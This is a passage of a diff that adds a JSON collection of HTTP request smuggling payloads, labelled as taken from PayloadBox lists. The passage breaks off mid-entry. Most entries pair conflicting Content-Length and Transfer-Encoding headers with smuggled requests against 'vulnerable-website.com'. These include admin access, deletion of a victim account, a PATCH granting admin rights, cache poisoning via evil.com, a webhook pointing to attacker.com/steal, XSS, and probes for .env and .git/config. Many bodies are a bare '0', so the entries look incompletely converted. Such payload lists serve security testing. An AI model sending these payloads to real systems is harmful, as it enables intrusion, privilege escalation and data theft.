+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "87",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #30",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: HEAD /admin HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Method-Override": "GET"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #31",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "5e",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #32",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: HEAD /admin HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Method-Override": "GET"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #33",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "98",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nOPTIONS /admin HTTP/1.1\\r\\nHost: vulnerable-website.com\\r\\nAccess-Control-Request-Method: *",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #34",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "69\\r\\nOPTIONS /admin HTTP/1.1\\r\\nHost: vulnerable-website.com\\r\\nAccess-Control-Request-Method: *\\r\\n\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #35",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "122",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #36",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: GET /api/v1/users HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Authorization": "Bearer leaked-token",
+      "X-Admin": "true"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #37",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "85",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #38",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: GET /api/v1/users HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Authorization": "Bearer leaked-token",
+      "X-Admin": "true"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #39",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "93",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nTRACE / HTTP/1.1\\r\\nHost: vulnerable-website.com\\r\\nX-Custom-Header: reflected",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #40",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "64\\r\\nTRACE / HTTP/1.1\\r\\nHost: vulnerable-website.com\\r\\nX-Custom-Header: reflected\\r\\n\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #41",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "105",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, CL-TE-Payloads.txt, Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #42",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST /upload HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Type": "multipart/form-data"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #43",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "6f",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #44",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST /upload HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Type": "multipart/form-data"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #45",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "118",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #46",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: GET /graphql HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Type": "application/json"
+    },
+    "body": "{\"query\":\"mutation{__schema}\"}",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #47",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "7d",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #48",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: GET /graphql HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Type": "application/json"
+    },
+    "body": "{\"query\":\"mutation{__schema}\"}\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #49",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: DELETE /api/users/victim HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Authorization": "Bearer smuggled-token",
+      "Content-Length": "0"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #50",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "a2",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #51",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: DELETE /api/users/victim HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Authorization": "Bearer smuggled-token",
+      "Content-Length": "0"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #52",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "94",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nPATCH /api/settings HTTP/1.1\\r\\nHost: vulnerable-website.com\\r\\nContent-Length: 20\\r\\n\\r\\n{\"admin\":true}",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Bypass Payloads #53",
+    "description": "HTTP Request Smuggling probe from PayloadBox (Bypass-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Transfer-Encoding": "chunked",
+      "Content-Length": "4"
+    },
+    "body": "6b\\r\\nPATCH /api/settings HTTP/1.1\\r\\nHost: vulnerable-website.com\\r\\nContent-Length: 16\\r\\n\\r\\n{\"admin\":true}\\r\\n0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "Bypass-Payloads.txt, TE-CL-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #1",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Content-Length": "6",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nX",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt, Detection-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #2",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Content-Length": "4",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "1\\r\\nZ\\r\\nQ",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt, Detection-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #3",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Connection": "keep-alive",
+      "Content-Length": "6",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0\\r\\n\\r\\nTEST",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt, Detection-Payloads.txt, Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #4",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "30",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt, Detection-Payloads.txt, Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #5",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: GET /404 HTTP/1.1",
+    "headers": {
+      "X": "X"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt, Detection-Payloads.txt, Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #6",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "44",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt, Detection-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #7",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: GET /404 HTTP/1.1",
+    "headers": {
+      "X-Ignore": "X"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt, Detection-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #8",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Content-Length": "49",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt, Detection-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #9",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "35",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt, Detection-Payloads.txt, Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #10",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "40",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt, Detection-Payloads.txt, Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #11",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: GET /test HTTP/1.1",
+    "headers": {
+      "Foo": "bar"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt, Detection-Payloads.txt, Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #12",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "50",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt, Detection-Payloads.txt, Time-Based-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #13",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "83",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #14",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: GET /admin/delete?username=victim HTTP/1.1",
+    "headers": {
+      "Host": "localhost",
+      "Foo": "x"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #15",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "124",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #16",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: POST /admin/delete HTTP/1.1",
+    "headers": {
+      "Host": "localhost",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Content-Length": "15"
+    },
+    "body": "username=carlos",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #17",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "65",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #18",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "88",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt, Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #19",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: GET /account HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Cookie": "session=stolen"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt, Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #20",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "145",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt, Cache-Poisoning-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #21",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Content-Length": "100"
+    },
+    "body": "search=<script>alert(1)</script>",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #22",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "76",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #23",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: GET /api/users HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-API-Key": ""
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #24",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: GET / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Custom-IP-Authorization": "127.0.0.1"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #25",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "97",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #26",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: GET /cache-me HTTP/1.1",
+    "headers": {
+      "Host": "evil-attacker.com",
+      "X-Malicious": "payload"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #27",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "115",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt, Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #28",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: GET / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Cache-Key": "poisoned",
+      "X-Forwarded-Host": "evil.com"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #29",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "134",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #30",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "79",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #31",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "127",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #32",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: GET /socket.io/ HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Upgrade": "websocket",
+      "Connection": "Upgrade"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #33",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: GET /.git/config HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Git": "exposed"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #34",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: GET /.env HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Environment": "exposed"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #35",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "101",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #36",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: GET /backup.zip HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Backup": "download"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #37",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "136",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #38",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: POST /webhook HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Type": "application/json",
+      "Content-Length": "50"
+    },
+    "body": "{\"url\":\"http://attacker.com/steal\"}",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #39",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "98",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt, Session-Hijacking-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #40",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: GET /debug HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Debug": "true",
+      "X-Trace": "enabled"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #41",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "114",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #42",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: GET /metrics HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Authorization": "Basic YWRtaW46YWRtaW4="
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #43",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: GET /health HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "X-Internal": "check"
+    },
+    "body": "",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #44",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: POST / HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Length": "143",
+      "Transfer-Encoding": "chunked"
+    },
+    "body": "0",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #45",
+    "description": "HTTP Request Smuggling probe from PayloadBox (CL-TE-Payloads.txt). Target request line: POST /api/oauth/token HTTP/1.1",
+    "headers": {
+      "Host": "vulnerable-website.com",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Content-Length": "40"
+    },
+    "body": "grant_type=client_credentials",
+    "sourceType": "PayloadBox",
+    "sourceFile": "CL-TE-Payloads.txt"
+  },
+  {
+    "name": "Cl Te Payloads #46",
